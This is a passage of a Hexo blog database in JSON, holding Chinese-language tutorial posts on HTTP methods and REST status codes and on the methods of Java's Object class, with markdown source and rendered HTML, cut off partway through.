[*]：服务器发生错误，用户将无法判断发出的请求是否成功。</li>\n</ul>\n<h2 id=\"参考链接\"><a href=\"#参考链接\" class=\"headerlink\" title=\"参考链接\"></a>参考链接</h2><ul>\n<li><a href=\"https://www.w3schools.com/tags/ref_httpmethods.asp\" target=\"_blank\" rel=\"external\">HTTP Methods: GET vs. POST</a></li>\n<li><a href=\"http://www.ruanyifeng.com/blog/2014/05/restful_api.html\" target=\"_blank\" rel=\"external\">RESTful API 设计指南</a></li>\n</ul>\n","excerpt":"<p>在综合考虑下，决定复习一些Web方向的东西，以备不时之需。。。。</p>\n<h2 id=\"What-is-HTTP\"><a href=\"#What-is-HTTP\" class=\"headerlink\" title=\"What is HTTP?\"></a>What is HTTP?</h2><p>HTTP全称<code>Hypertext Transfer Protocol</code>(就是中文常说的<code>超文本传输协议</code>)，这个协议是为了客户端和服务端能进行通信。HTTP是客户端和服务端进行请求响应过程的协议，客户端发送请求，服务端响应这个请求并返回信息。通常一个web浏览器作为一个客户端，而一台提供web服务的机器作为服务端。</p>\n<h2 id=\"Two-HTTP-Request-Methods-GET-and-POST\"><a href=\"#Two-HTTP-Request-Methods-GET-and-POST\" class=\"headerlink\" title=\"Two HTTP Request Methods: GET and POST\"></a>Two HTTP Request Methods: GET and POST</h2><p>两个非常常用的请求响应方法 : GET and POST。</p>\n<ul>\n<li><code>GET</code>- Requests data from a specified resource</li>\n<li><code>POST</code>- Submits data to be processed to a specified resource</li>\n</ul>\n<h3 id=\"The-GET-Method\"><a href=\"#The-GET-Method\" class=\"headerlink\" title=\"The GET Method\"></a>The GET Method</h3><p>GET请求方法会将请求信息放在URL中<br><figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/test/demo_form.php?name1=value1&amp;name2=value2</span><br></pre></td></tr></table></figure></p>\n<p>GET其他特性：</p>\n<ul>\n<li>GET请求能被缓存</li>\n<li>GET请求会保留在浏览器的历史记录中</li>\n<li>GET请求可以被标为书签</li>\n<li>GET请求不应该用在处理敏感数据时候</li>\n<li>GET请求有长度限制</li>\n<li>GET只应该用在取回数据</li>\n</ul>\n<blockquote>\n<p>总的来说，由于GET请求数据被放在URL中，以及它能缓存，便导致了上述的其他特性。诸如<code>GET请求会保留在浏览器的历史记录中</code> <code>GET请求可以被标为书签</code> <code>GET请求不应该用在处理敏感数据时候</code>这三条就是因为GET请求会被缓存，且请求数据在URL中，又因为浏览器或者说操作系统对URL的长度有要求，所以GET请求有长度限制。</p>\n</blockquote>","more":"<h3 id=\"The-POST-Method\"><a href=\"#The-POST-Method\" class=\"headerlink\" title=\"The POST Method\"></a>The POST Method</h3><p>POST请求包含的数据放在了HTTP数据报中<br><figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">POST /test/demo_form.php HTTP/1.1</span><br><span class=\"line\">Host: w3schools.com</span><br><span class=\"line\">name1=value1&amp;name2=value2</span><br></pre></td></tr></table></figure></p>\n<p>POST其他特性：</p>\n<ul>\n<li>POST请求不会被缓存</li>\n<li>POST请求不会保留在浏览器历史记录中</li>\n<li>POST请求不会被标记为书签</li>\n<li>POST请求对数据长度没有限制</li>\n</ul>\n<h2 id=\"Compare-GET-vs-POST\"><a href=\"#Compare-GET-vs-POST\" class=\"headerlink\" title=\"Compare GET vs. POST\"></a>Compare GET vs. POST</h2><table>\n<thead>\n<tr>\n<th></th>\n<th>GET</th>\n<th>POST</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>返回/回退</td>\n<td>没有任何影响(因为有缓存机制)</td>\n<td>数据会被重新提交(浏览器会提醒用户数据会被重新提交)</td>\n</tr>\n<tr>\n<td>书签</td>\n<td>可以作为书签</td>\n<td>不能作为书签</td>\n</tr>\n<tr>\n<td>缓存</td>\n<td>可以被缓存</td>\n<td>不能被缓存</td>\n</tr>\n<tr>\n<td>编码类型</td>\n<td>application/x-www-form-urlencoded</td>\n<td>application/x-www-form-urlencoded or multipart/form-data. Use multipart encoding for binary data</td>\n</tr>\n<tr>\n<td>历史记录</td>\n<td>参数会保留在浏览器历史记录中</td>\n<td>参数不会保留在历史记录中</td>\n</tr>\n<tr>\n<td>数据长度限制</td>\n<td>GET数据会放在URL中，URL的最大长度为2048个字符</td>\n<td>没有限制</td>\n</tr>\n<tr>\n<td>数据类型限制</td>\n<td>只允许ASCII字符</td>\n<td>没有限制</td>\n</tr>\n<tr>\n<td>安全性</td>\n<td>GET数据安全性低于PSOT，因为它将数据放入URL(一定不用GET发送密码或者其他敏感数据)</td>\n<td>POST安全性略高于GET，它的数据不会保留在浏览器历史中，也不会保留在服务器日志文件中(但不是绝对安全，其他人可以截获数据包，分析数据包得到数据)</td>\n</tr>\n</tbody>\n</table>\n<h2 id=\"Other-HTTP-Request-Methods\"><a href=\"#Other-HTTP-Request-Methods\" class=\"headerlink\" title=\"Other HTTP Request Methods\"></a>Other HTTP Request Methods</h2><table>\n<thead>\n<tr>\n<th>Method</th>\n<th>Description</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>HEAD</td>\n<td>Same as GET but returns only HTTP headers and no document body</td>\n</tr>\n<tr>\n<td>PUT</td>\n<td>Uploads a representation of the specified URI</td>\n</tr>\n<tr>\n<td>DELETE</td>\n<td>Deletes the specified resource</td>\n</tr>\n<tr>\n<td>OPTIONS</td>\n<td>Returns the HTTP methods that the server supports</td>\n</tr>\n<tr>\n<td>CONNECT</td>\n<td>Converts the request connection to a transparent TCP/IP tunnel</td>\n</tr>\n</tbody>\n</table>\n<h2 id=\"REST-方法使用标准\"><a href=\"#REST-方法使用标准\" class=\"headerlink\" title=\"REST 方法使用标准\"></a>REST 方法使用标准</h2><p>下列是常用的REST方法定义：</p>\n<ul>\n<li>GET（SELECT）：从服务器取出资源（一项或多项）</li>\n<li>POST（CREATE）：在服务器新建一个资源</li>\n<li>PUT（UPDATE）：在服务器更新资源（客户端提供改变后的完整资源）</li>\n<li>PATCH（UPDATE）：在服务器更新资源（客户端提供改变的属性）</li>\n<li>DELETE（DELETE）：从服务器删除资源</li>\n</ul>\n<p>使用例子：</p>\n<ul>\n<li>GET /zoos：列出所有动物园</li>\n<li>POST /zoos：新建一个动物园</li>\n<li>GET /zoos/ID：获取某个指定动物园的信息</li>\n<li>PUT /zoos/ID：更新某个指定动物园的信息（提供该动物园的全部信息</li>\n<li>PATCH /zoos/ID：更新某个指定动物园的信息（提供该动物园的部分信息）</li>\n<li>DELETE /zoos/ID：删除某个动物园</li>\n<li>GET /zoos/ID/animals：列出某个指定动物园的所有动物</li>\n<li>DELETE /zoos/ID/animals/ID：删除某个指定动物园的指定动物</li>\n</ul>\n<h2 id=\"状态码-Status-Code\"><a href=\"#状态码-Status-Code\" class=\"headerlink\" title=\"状态码(Status Code)\"></a>状态码(Status Code)</h2><ul>\n<li>200 OK - [GET]：服务器成功返回用户请求的数据，该操作是幂等的(Idempotent)</li>\n<li>201 CREATED - [POST/PUT/PATCH]：用户新建或修改数据成功。</li>\n<li>202 Accepted - [*]：表示一个请求已经进入后台排队(异步任务)</li>\n<li>204 NO CONTENT - [DELETE]：用户删除数据成功。</li>\n<li>400 INVALID REQUEST - [POST/PUT/PATCH]：用户发出的请求有错误，服务器没有进行新建或修改数据的操作，该操作是幂等的。</li>\n<li>401 Unauthorized - [*]：表示用户没有权限（令牌、用户名、密码错误）。</li>\n<li>403 Forbidden - [*] 表示用户得到授权（与401错误相对），但是访问是被禁止的。</li>\n<li>404 NOT FOUND - [*]：用户发出的请求针对的是不存在的记录，服务器没有进行操作，该操作是幂等的。</li>\n<li>406 Not Acceptable - [GET]：用户请求的格式不可得（比如用户请求JSON格式，但是只有XML格式）。</li>\n<li>410 Gone -[GET]：用户请求的资源被永久删除，且不会再得到的。</li>\n<li>422 Unprocesable entity - [POST/PUT/PATCH] 当创建一个对象时，发生一个验证错误。</li>\n<li>500 INTERNAL SERVER ERROR - [*]：服务器发生错误，用户将无法判断发出的请求是否成功。</li>\n</ul>\n<h2 id=\"参考链接\"><a href=\"#参考链接\" class=\"headerlink\" title=\"参考链接\"></a>参考链接</h2><ul>\n<li><a href=\"https://www.w3schools.com/tags/ref_httpmethods.asp\">HTTP Methods: GET vs. POST</a></li>\n<li><a href=\"http://www.ruanyifeng.com/blog/2014/05/restful_api.html\">RESTful API 设计指南</a></li>\n</ul>"},{"title":"Java Object","date":"2018-04-28T07:18:23.000Z","_content":"\n## Obejct简介\nObject类是Java中所有类的基类，在编译时会自动导入，位于java.lang包中，而Object中具有的属性和行为，是Java语言设计背后的思维体现。Object类中的大部分方法都是native方法，用此关键字修饰的方法是Java中的本地方法，一般是用C/C++语言来实现。\n\n## native 关键字\nnative是与C\\++联合开发的时候用的！java自己开发不用的！使用native关键字说明这个方法是原生函数，也就是这个方法是用C/C\\++语言实现的，并且被编译成了DLL，由java去调用。 这些函数的实现体在DLL中，JDK的源代码中并不包含，你应该是看不到的。对于不同的平台它们也是不同的。这也是java的底层机制，实际上java就是在不同的平台上调用不同的native方法实现对操作系统的访问的。native 是用做java 和其他语言（如c++）进行协作时用的 也就是native 后的函数的实现不是用java写的。native的意思就是通知操作系统， 这个函数你必须给我实现，因为我要使用。 所以native关键字的函数都是操作系统实现的， java只能调用。java是跨平台的语言，既然是跨了平台，所付出的代价就是牺牲一些对底层的控制，而java要实现对底层的控制，就需要一些其他语言的帮助，这个就是native的作用了。\n<!--more-->\n\n## Object 构造函数\n大部分情况下，Java中通过形如 new A(args..)形式创建一个属于该类型的对象。其中A即是类名，A(args..)即此类定义中相对应的构造函数。通过此种形式创建的对象都是通过类中的构造函数完成。为体现此特性，Java中规定：在类定义过程中，对于未定义构造函数的类，默认会有一个无参数的构造函数，作为所有类的基类，Object类自然要反映出此特性，在源码中，未给出Object类构造函数定义，但实际上，此构造函数是存在的。\n\n当然，并不是所有的类都是通过此种方式去构建，也自然的，并不是所有的类构造函数都是**public**\n\n## registerNatives()\n``` java\nprivate static native void registerNatives();\nstatic {\n    registerNatives();\n}\n```\n该方法主要作用是将C/C\\++中的方法映射到Java中的native方法，实现方法命名的解耦。registerNatives的修饰为private，因此该方法只在Object中使用，而接下来的static代码块在类加载的时候加载调用registerNatives方法。可以理解为这是Java在为使用底层做准备。\n\n## getClass()\n``` java\npublic final native Class<?> getClass();\n```\n该方法返回该对象的Class，同时可以直接通过`Object.class`来返回相同结果。例如：\n``` java\npackage com.fenlan.base;\npublic class Test {\n    public static void main(String[] args) {\n        System.out.println(Test.class);\n    }\n}\n```\n该结果返回`class com.fenlan.base.Test`，这是这个对象运行时class\n\n## hashCode()\n``` java\npublic native int hashCode();\n```\n该方法返回对象的hash整型码值，关于hashCode()方法的介绍，在[这里有深入说明](http://fenlan.github.io/2018/03/01/Java%E5%B0%8F%E8%AE%B0/)，为对象设置hash值是为了支持hash tables 诸如HashMap、HashSet。hashCode()和equals()方法是经常被重写的方法，具体的重写准则如下:\n- 在Java应用程序程序执行期间，对于同一对象多次调用hashCode()方法时，其返回的哈希码是相同的，前提是将对象进行equals比较时所用的标尺信息未做修改。在Java应用程序的一次执行到另外一次执行，同一对象的hashCode()返回的哈希码无须保持一致；\n- 如果两个对象相等（依据：调用equals()方法），那么这两个对象调用hashCode()返回的哈希码也必须相等；\n- 反之，两个对象调用hasCode()返回的哈希码相等，这两个对象不一定相等。程序员应该意识到，为不相等的对象生成不同的整数结果可能会提高散列表的性能。\n\n## equals()\n``` java\npublic boolean equals(Object obj) {\n    return (this == obj);\n}\n```\n`==`与`equals`在Java中经常被使用，大家也都知道==与equals的区别：==表示的是变量值完成相同(对于基础类型，地址中存储的是值，引用类型则存储指向实际对象的地址)；equals表示的是对象的内容完全相同，此处的内容多指对象的特征/属性。\n\n那么问题来了，Object里面调用了`==`那为什么还需要`equals`，equlas()方法的正确理解应该是：判断两个对象是否相等。那么判断对象相等的标尺又是什么？Object判断相等是两个引用具有相同对象地址，但其他情况下我们不需要这么严格的要求，诸如两个类只要某些属性相同就可以认为是相等的，那么就需要重写`equals`。\n\n## clone()\n``` java\nprotected native Object clone() throws CloneNotSupportedException;\n```\n克隆方法是返回一个当前对象的拷贝，而这里的拷贝精确定义需要依赖这个对象的类定义。\n\n## toString()\n``` java\npublic String toString() {\n    return getClass().getName() + \"@\" + Integer.toHexString(hashCode());\n}\n```\n返回一个表示当前对象的字符串，通过这个这个字符串可以简单的表示一些对象信息，为了更多的展示对象信息，可以选择重写该方法。默认情况下返回当前对象的类名和十六进制的hashCode。\n\n## notify()\n``` java\npublic final native void notify();\n```\n该方法唤醒一个等待在`this object's monitor`的单线程。如果有多个线程等待这个对象，那么唤醒其中一个。而`Object's monitor`中的线程是之前调用了`wait`方法。此外其他的说明参考源码注释。\n\n> Wakes up a single thread that is waiting on this object's monitor. If any threads are waiting on this object, one of them is chosen to be awakened. The choice is arbitrary and occurs atthe discretion of the implementation. A thread waits on an object's monitor by calling one of the {@code wait} methods.\n\n> This method should only be called by a thread that is the owner of this object's monitor. A thread becomes the owner of the object's monitor in one of three ways:\n> 1. By executing a synchronized instance method of that object.\n> 2. By executing the body of a {@code synchronized} statement that synchronizes on the object.\n> 3. For objects of type {@code Class,} by executing a synchronized static method of that class.\n\n> Only one thread at a time can own an object's monitor.\n\n## notifyAll()\n``` java\npublic final native void notifyAll();\n```\n该方法唤醒所有等待在`Object's monitor`的线程。具体的`notify`和`notifyAll`参考其他文章。\n\n## wait()\n``` java\npublic final native void wait(long timeout) throws InterruptedException;\n```\n让当前线程等待直到其他线程调用`notify()`并选择当前对象或者`notifyAll()`又或者指定等待时间过去。此外，一个线程在等待过程中被中断，会抛出中断异常。\n\n## finalize()\n``` java\nprotected void finalize() throws Throwable { }\n```\n在垃圾回收时确定没有引用在这个对象上时会调用这个方法。子类重写该方法决定如何去清理这个对象。\n\n## 参考链接\n- [Java-Object类源码解析](https://blog.csdn.net/benjaminlee1/article/details/72843713)\n- [java native关键字](https://blog.csdn.net/youjianbo_han_87/article/details/2586375)\n- [java object类详解](https://zhuanlan.zhihu.com/p/29511703)","source":"_posts/JavaObject.md","raw":"---\ntitle: Java Object\ndate: 2018-04-28 15:18:23\ncategories: Java\ntags:\n  - Java\n  - Object\n  - 线程\n---\n\n## Obejct简介\nObject类是Java中所有类的基类，在编译时会自动导入，位于java.lang包中，而Object中具有的属性和行为，是Java语言设计背后的思维体现。Object类中的大部分方法都是native方法，用此关键字修饰的方法是Java中的本地方法，一般是用C/C++语言来实现。\n\n## native 关键字\nnative是与C\\++联合开发的时候用的！java自己开发不用的！使用native关键字说明这个方法是原生函数，也就是这个方法是用C/C\\++语言实现的，并且被编译成了DLL，由java去调用。 这些函数的实现体在DLL中，JDK的源代码中并不包含，你应该是看不到的。对于不同的平台它们也是不同的。这也是java的底层机制，实际上java就是在不同的平台上调用不同的native方法实现对操作系统的访问的。native 是用做java 和其他语言（如c++）进行协作时用的 也就是native 后的函数的实现不是用java写的。native的意思就是通知操作系统， 这个函数你必须给我实现，因为我要使用。 所以native关键字的函数都是操作系统实现的， java只能调用。java是跨平台的语言，既然是跨了平台，所付出的代价就是牺牲一些对底层的控制，而java要实现对底层的控制，就需要一些其他语言的帮助，这个就是native的作用了。\n<!--more-->\n\n## Object 构造函数\n大部分情况下，Java中通过形如 new A(args..)形式创建一个属于该类型的对象。其中A即是类名，A(args..)即此类定义中相对应的构造函数。通过此种形式创建的对象都是通过类中的构造函数完成。为体现此特性，Java中规定：在类定义过程中，对于未定义构造函数的类，默认会有一个无参数的构造函数，作为所有类的基类，Object类自然要反映出此特性，在源码中，未给出Object类构造函数定义，但实际上，此构造函数是存在的。\n\n当然，并不是所有的类都是通过此种方式去构建，也自然的，并不是所有的类构造函数都是**public**\n\n## registerNatives()\n``` java\nprivate static native void registerNatives();\nstatic {\n    registerNatives();\n}\n```\n该方法主要作用是将C/C\\++中的方法映射到Java中的native方法，实现方法命名的解耦。registerNatives的修饰为private，因此该方法只在Object中使用，而接下来的static代码块在类加载的时候加载调用registerNatives方法。可以理解为这是Java在为使用底层做准备。\n\n## getClass()\n``` java\npublic final native Class<?> getClass();\n```\n该方法返回该对象的Class，同时可以直接通过`Object.class`来返回相同结果。例如：\n``` java\npackage com.fenlan.base;\npublic class Test {\n    public static void main(String[] args) {\n        System.out.println(Test.class);\n    }\n}\n```\n该结果返回`class com.fenlan.base.Test`，这是这个对象运行时class\n\n## hashCode()\n``` java\npublic native int hashCode();\n```\n该方法返回对象的hash整型码值，关于hashCode()方法的介绍，在[这里有深入说明](http://fenlan.github.io/2018/03/01/Java%E5%B0%8F%E8%AE%B0/)，为对象设置hash值是为了支持hash tables 诸如HashMap、HashSet。hashCode()和equals()方法是经常被重写的方法，具体的重写准则如下:\n- 在Java应用程序程序执行期间，对于同一对象多次调用hashCode()方法时，其返回的哈希码是相同的，前提是将对象进行equals比较时所用的标尺信息未做修改。在Java应用程序的一次执行到另外一次执行，同一对象的hashCode()返回的哈希码无须保持一致；\n- 如果两个对象相等（依据：调用equals()方法），那么这两个对象调用hashCode()返回的哈希码也必须相等；\n- 反之，两个对象调用hasCode()返回的哈希码相等，这两个对象不一定相等。程序员应该意识到，为不相等的对象生成不同的整数结果可能会提高散列表的性能。\n\n## equals()\n``` java\npublic boolean equals(Object obj) {\n    return (this == obj);\n}\n```\n`==`与`equals`在Java中经常被使用，大家也都知道==与equals的区别：==表示的是变量值完成相同(对于基础类型，地址中存储的是值，引用类型则存储指向实际对象的地址)；equals表示的是对象的内容完全相同，此处的内容多指对象的特征/属性。\n\n那么问题来了，Object里面调用了`==`那为什么还需要`equals`，equlas()方法的正确理解应该是：判断两个对象是否相等。那么判断对象相等的标尺又是什么？Object判断相等是两个引用具有相同对象地址，但其他情况下我们不需要这么严格的要求，诸如两个类只要某些属性相同就可以认为是相等的，那么就需要重写`equals`。\n\n## clone()\n``` java\nprotected native Object clone() throws CloneNotSupportedException;\n```\n克隆方法是返回一个当前对象的拷贝，而这里的拷贝精确定义需要依赖这个对象的类定义。\n\n## toString()\n``` java\npublic String toString() {\n    return getClass().getName() + \"@\" + Integer.toHexString(hashCode());\n}\n```\n返回一个表示当前对象的字符串，通过这个这个字符串可以简单的表示一些对象信息，为了更多的展示对象信息，可以选择重写该方法。默认情况下返回当前对象的类名和十六进制的hashCode。\n\n## notify()\n``` java\npublic final native void notify();\n```\n该方法唤醒一个等待在`this object's monitor`的单线程。如果有多个线程等待这个对象，那么唤醒其中一个。而`Object's monitor`中的线程是之前调用了`wait`方法。此外其他的说明参考源码注释。\n\n> Wakes up a single thread that is waiting on this object's monitor. If any threads are waiting on this object, one of them is chosen to be awakened. The choice is arbitrary and occurs atthe discretion of the implementation. A thread waits on an object's monitor by calling one of the {@code wait} methods.\n\n> This method should only be called by a thread that is the owner of this object's monitor. A thread becomes the owner of the object's monitor in one of three ways:\n> 1. By executing a synchronized instance method of that object.\n> 2. By executing the body of a {@code synchronized} statement that synchronizes on the object.\n> 3. For objects of type {@code Class,} by executing a synchronized static method of that class.\n\n> Only one thread at a time can own an object's monitor.\n\n## notifyAll()\n``` java\npublic final native void notifyAll();\n```\n该方法唤醒所有等待在`Object's monitor`的线程。具体的`notify`和`notifyAll`参考其他文章。\n\n## wait()\n``` java\npublic final native void wait(long timeout) throws InterruptedException;\n```\n让当前线程等待直到其他线程调用`notify()`并选择当前对象或者`notifyAll()`又或者指定等待时间过去。此外，一个线程在等待过程中被中断，会抛出中断异常。\n\n## finalize()\n``` java\nprotected void finalize() throws Throwable { }\n```\n在垃圾回收时确定没有引用在这个对象上时会调用这个方法。子类重写该方法决定如何去清理这个对象。\n\n## 参考链接\n- [Java-Object类源码解析](https://blog.csdn.net/benjaminlee1/article/details/72843713)\n- [java native关键字](https://blog.csdn.net/youjianbo_han_87/article/details/2586375)\n- [java object类详解](https://zhuanlan.zhihu.com/p/29511703)","slug":"JavaObject","published":1,"updated":"2018-05-03T06:17:40.203Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjgrjscww0008yp0lahwegbi8","content":"<h2 id=\"Obejct简介\"><a href=\"#Obejct简介\" class=\"headerlink\" title=\"Obejct简介\"></a>Obejct简介</h2><p>Object类是Java中所有类的基类，在编译时会自动导入，位于java.lang包中，而Object中具有的属性和行为，是Java语言设计背后的思维体现。Object类中的大部分方法都是native方法，用此关键字修饰的方法是Java中的本地方法，一般是用C/C++语言来实现。</p>\n<h2 id=\"native-关键字\"><a href=\"#native-关键字\" class=\"headerlink\" title=\"native 关键字\"></a>native 关键字</h2><p>native是与C++联合开发的时候用的！java自己开发不用的！使用native关键字说明这个方法是原生函数，也就是这个方法是用C/C++语言实现的，并且被编译成了DLL，由java去调用。 这些函数的实现体在DLL中，JDK的源代码中并不包含，你应该是看不到的。对于不同的平台它们也是不同的。这也是java的底层机制，实际上java就是在不同的平台上调用不同的native方法实现对操作系统的访问的。native 是用做java 和其他语言（如c++）进行协作时用的 也就是native 后的函数的实现不是用java写的。native的意思就是通知操作系统， 这个函数你必须给我实现，因为我要使用。 所以native关键字的函数都是操作系统实现的， java只能调用。java是跨平台的语言，既然是跨了平台，所付出的代价就是牺牲一些对底层的控制，而java要实现对底层的控制，就需要一些其他语言的帮助，这个就是native的作用了。<br><a id=\"more\"></a></p>\n<h2 id=\"Object-构造函数\"><a href=\"#Object-构造函数\" class=\"headerlink\" title=\"Object 构造函数\"></a>Object 构造函数</h2><p>大部分情况下，Java中通过形如 new A(args..)形式创建一个属于该类型的对象。其中A即是类名，A(args..)即此类定义中相对应的构造函数。通过此种形式创建的对象都是通过类中的构造函数完成。为体现此特性，Java中规定：在类定义过程中，对于未定义构造函数的类，默认会有一个无参数的构造函数，作为所有类的基类，Object类自然要反映出此特性，在源码中，未给出Object类构造函数定义，但实际上，此构造函数是存在的。</p>\n<p>当然，并不是所有的类都是通过此种方式去构建，也自然的，并不是所有的类构造函数都是<strong>public</strong></p>\n<h2 id=\"registerNatives\"><a href=\"#registerNatives\" class=\"headerlink\" title=\"registerNatives()\"></a>registerNatives()</h2><figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">private</span> <span class=\"keyword\">static</span> <span class=\"keyword\">native</span> <span class=\"keyword\">void</span> <span class=\"title\">registerNatives</span><span class=\"params\">()</span></span>;</span><br><span class=\"line\"><span class=\"keyword\">static</span> &#123;</span><br><span class=\"line\">    registerNatives();</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>该方法主要作用是将C/C++中的方法映射到Java中的native方法，实现方法命名的解耦。registerNatives的修饰为private，因此该方法只在Object中使用，而接下来的static代码块在类加载的时候加载调用registerNatives方法。可以理解为这是Java在为使用底层做准备。</p>\n<h2 id=\"getClass\"><a href=\"#getClass\" class=\"headerlink\" title=\"getClass()\"></a>getClass()</h2><figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">final</span> <span class=\"keyword\">native</span> Class&lt;?&gt; getClass();</span><br></pre></td></tr></table></figure>\n<p>该方法返回该对象的Class，同时可以直接通过<code>Object.class</code>来返回相同结果。例如：<br><figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">package</span> com.fenlan.base;</span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Test</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String[] args)</span> </span>&#123;</span><br><span class=\"line\">        System.out.println(Test.class);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>该结果返回<code>class com.fenlan.base.Test</code>，这是这个对象运行时class</p>\n<h2 id=\"hashCode\"><a href=\"#hashCode\" class=\"headerlink\" title=\"hashCode()\"></a>hashCode()</h2><figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">native</span> <span class=\"keyword\">int</span> <span class=\"title\">hashCode</span><span class=\"params\">()</span></span>;</span><br></pre></td></tr></table></figure>\n<p>该方法返回对象的hash整型码值，关于hashCode()方法的介绍，在<a href=\"http://fenlan.github.io/2018/03/01/Java%E5%B0%8F%E8%AE%B0/\">这里有深入说明</a>，为对象设置hash值是为了支持hash tables 诸如HashMap、HashSet。hashCode()和equals()方法是经常被重写的方法，具体的重写准则如下:</p>\n<ul>\n<li>在Java应用程序程序执行期间，对于同一对象多次调用hashCode()方法时，其返回的哈希码是相同的，前提是将对象进行equals比较时所用的标尺信息未做修改。在Java应用程序的一次执行到另外一次执行，同一对象的hashCode()返回的哈希码无须保持一致；</li>\n<li>如果两个对象相等（依据：调用equals()方法），那么这两个对象调用hashCode()返回的哈希码也必须相等；</li>\n<li>反之，两个对象调用hasCode()返回的哈希码相等，这两个对象不一定相等。程序员应该意识到，为不相等的对象生成不同的整数结果可能会提高散列表的性能。</li>\n</ul>\n<h2 id=\"equals\"><a href=\"#equals\" class=\"headerlink\" title=\"equals()\"></a>equals()</h2><figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">boolean</span> <span class=\"title\">equals</span><span class=\"params\">(Object obj)</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> (<span class=\"keyword\">this</span> == obj);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p><code>==</code>与<code>equals</code>在Java中经常被使用，大家也都知道==与equals的区别：==表示的是变量值完成相同(对于基础类型，地址中存储的是值，引用类型则存储指向实际对象的地址)；equals表示的是对象的内容完全相同，此处的内容多指对象的特征/属性。</p>\n<p>那么问题来了，Object里面调用了<code>==</code>那为什么还需要<code>equals</code>，equlas()方法的正确理解应该是：判断两个对象是否相等。那么判断对象相等的标尺又是什么？Object判断相等是两个引用具有相同对象地址，但其他情况下我们不需要这么严格的要求，诸如两个类只要某些属性相同就可以认为是相等的，那么就需要重写<code>equals</code>。</p>\n<h2 id=\"clone\"><a href=\"#clone\" class=\"headerlink\" title=\"clone()\"></a>clone()</h2><figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">protected</span> <span class=\"keyword\">native</span> Object <span class=\"title\">clone</span><span class=\"params\">()</span> <span class=\"keyword\">throws</span> CloneNotSupportedException</span>;</span><br></pre></td></tr></table></figure>\n<p>克隆方法是返回一个当前对象的拷贝，而这里的拷贝精确定义需要依赖这个对象的类定义。</p>\n<h2 id=\"toString-NaN\"><a href=\"#toString-NaN\" class=\"headerlink\" title=\"toString()\"></a>toString()</h2><figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">public</span> String <span class=\"title\">toString</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> getClass().getName() + <span class=\"string\">\"@\"</span> + Integer.toHexString(hashCode());</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>返回一个表示当前对象的字符串，通过这个这个字符串可以简单的表示一些对象信息，为了更多的展示对象信息，可以选择重写该方法。默认情况下返回当前对象的类名和十六进制的hashCode。</p>\n<h2 id=\"notify\"><a href=\"#notify\" class=\"headerlink\" title=\"notify()\"></a>notify()</h2><figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">final</span> <span class=\"keyword\">native</span> <span class=\"keyword\">void</span> <span class=\"title\">notify</span><span class=\"params\">()</span></span>;</span><br></pre></td></tr></table></figure>\n<p>该方法唤醒一个等待在<code>this object&#39;s monitor</code>的单线程。如果有多个线程等待这个对象，那么唤醒其中一个。而<code>Object&#39;s monitor</code>中的线程是之前调用了<code>wait</code>方法。此外其他的说明参考源码注释。</p>\n<blockquote>\n<p>Wakes up a single thread that is waiting on this object’s monitor. If any threads are waiting on this object, one of them is chosen to be awakened. The choice is arbitrary and occurs atthe discretion of the implementation. A thread waits on an object’s monitor by calling one of the {@code wait} methods.</p>\n<p>This method should only be called by a thread that is the owner of this object’s monitor. A thread becomes the owner of the object’s monitor in one of three ways:</p>\n<ol>\n<li>By executing a synchronized instance method of that object.</li>\n<li>By executing the body of a {@code synchronized} statement that synchronizes on the object.</li>\n<li>For objects of type {@code Class,} by executing a synchronized static method of that class.</li>\n</ol>\n<p>Only one thread at a time can own an object’s monitor.</p>\n</blockquote>\n<h2 id=\"notifyAll\"><a 